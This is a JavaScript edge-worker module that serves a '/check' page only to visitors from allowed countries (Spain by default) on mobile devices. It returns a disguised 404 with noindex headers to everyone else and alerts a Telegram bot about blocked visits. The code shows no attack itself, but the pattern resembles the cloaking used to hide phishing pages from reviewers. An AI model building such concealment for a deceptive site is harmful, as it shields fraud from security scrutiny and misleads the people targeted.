import operationalWorker from "./m22-operational-monitor-entry.js";
import { clientIp, networkInfo } from "./engine/network.js";
import { boolEnv, csvSet } from "./engine/config.js";
import { evaluateV63MobileGate } from "./compat/v63/device.js";
import { checkMonitorRateLimit } from "./adaptive/monitor-rate-limit.js";
import { sendTelegramWithKeyboard } from "./adaptive/manual-ip-block.js";

function waitUntil(ctx, promise) {
  if (ctx?.waitUntil) ctx.waitUntil(promise);
  else return promise;
}

function isMonitorPage(pathname) {
  return pathname === "/" || pathname === "" || pathname === "/check" || pathname === "/check/";
}

function countryAllowed(env, country) {
  const allowed = csvSet(env.ALLOWED_COUNTRIES, "ES");
  const normalized = String(country || "").trim().toUpperCase();
  if (!normalized) return true;
  return allowed.size === 0 || allowed.has(normalized);
}

function rateLimitPerMinute(env) {
  return Math.max(1, Math.min(120, Number(env.RATE_LIMIT_PER_MIN || 3) || 3));
}

function clean(value, max = 160) {
  return String(value ?? "")
    .replace(/[\r\n\t]+/g, " ")
    .replace(/\s{2,}/g, " ")
    .trim()
    .slice(0, max);
}

function buildDeviceBlockMessage(network = {}, gate = {}) {
  return [
    "🖥️ BLOCK_BY_DEVICE",
    `Country: ${clean(network.country || "?")}`,
    `ASN: ${clean(network.asn || "?")}`,
    `Org: ${clean(network.org || "?")}`,
    "MobileOnly: true",
    `Device: ${clean(gate.device || "desktop")}`,
    `Reason: ${clean(gate.reason || "desktop_not_allowed")}`,
    "Decision: block",
    "Enforcement: BLOCK_URL or 404 fallback",
    "DatasetEligible: false",
    "RawIP/UA stored: false",
  ].join("\n");
}

async function health(request, env, ctx) {
  const response = await operationalWorker.fetch(request, env, ctx);
  let data;
  try {
    data = await response.clone().json();
  } catch {
    return response;
  }

  return Response.json(
    {
      ...data,
      m22_policy_enforcement_order: ["country", "mobile_only_device", "manual_ip", "monitor_ai"],
      m22_mobile_only_policy_enabled: boolEnv(env.MOBILE_ONLY, true),
      m22_mobile_only_policy_precedes_monitor_verdict: true,
      m22_mobile_only_desktop_enforcing: boolEnv(env.MOBILE_ONLY, true),
      m22_mobile_only_desktop_block_status: 404,
      m22_desktop_block_title: "BLOCK_BY_DEVICE",
      m22_ai_bot_enforcing: false,
    },
    { status: response.status, headers: { "cache-control": "no-store" } }
  );
}

async function monitorPage(request, env, ctx) {
  const network = networkInfo(request);

  // Country policy is deliberately first. The operational worker owns the
  // country-block Telegram message, exact-IP rate limit, and block response.
  if (!countryAllowed(env, network.country)) {
    return operationalWorker.fetch(request, env, ctx);
  }

  if (boolEnv(env.MOBILE_ONLY, true)) {
    const gate = evaluateV63MobileGate({
      ua: request.headers.get("user-agent") || "",
      chMobile: request.headers.get("sec-ch-ua-mobile"),
      mobileOnly: true,
    });

    if (gate.outcome === "block") {
      const limiter = await checkMonitorRateLimit({
        db: env.DB,
        secret: env.CHALLENGE_SECRET,
        ip: clientIp(request),
        limit: rateLimitPerMinute(env),
      });

      if (limiter.allowed) {
        waitUntil(ctx, sendTelegramWithKeyboard(env, buildDeviceBlockMessage(network, gate), null));
      }

      return new Response("Not Found", {
        status: 404,
        headers: {
          "cache-control": "no-store",
          "x-robots-tag": "noindex, nofollow",
        },
      });
    }
  }

  return operationalWorker.fetch(request, env, ctx);
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (url.pathname === "/_health") {
      return health(request, env, ctx);
    }

    if (isMonitorPage(url.pathname)) {
      return monitorPage(request, env, ctx);
    }

    return operationalWorker.fetch(request, env, ctx);
  },
};
